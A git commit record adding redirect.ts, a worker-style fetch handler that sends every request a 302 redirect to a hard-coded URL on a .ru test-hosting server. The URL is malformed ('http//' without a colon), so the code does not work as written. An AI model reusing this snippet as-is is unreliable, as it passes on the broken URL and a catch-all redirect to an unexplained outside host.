41f797ffaf6e290f58854d37985317a103a9af54
yvonsguin-afk <yvonsguin@gmail.com>
2025-10-10 02:29:45 +0200

    Create redirect.ts

---
+++ redirect.ts
@@ -0,0 +1,16 @@
+// redirect.ts
+
+// Define the redirect URL
+const redirectUrl = "http//srv233619.hoster-test.ru/red"; // Replace with the URL you want to redirect to
+
+// Handle the request
+addEventListener("fetch", (event) => {
+  event.respondWith(
+    new Response(null, {
+      status: 302, // HTTP status for redirection
+      headers: {
+        "Location": redirectUrl, // The URL to redirect to
+      },
+    })
+  );
+});
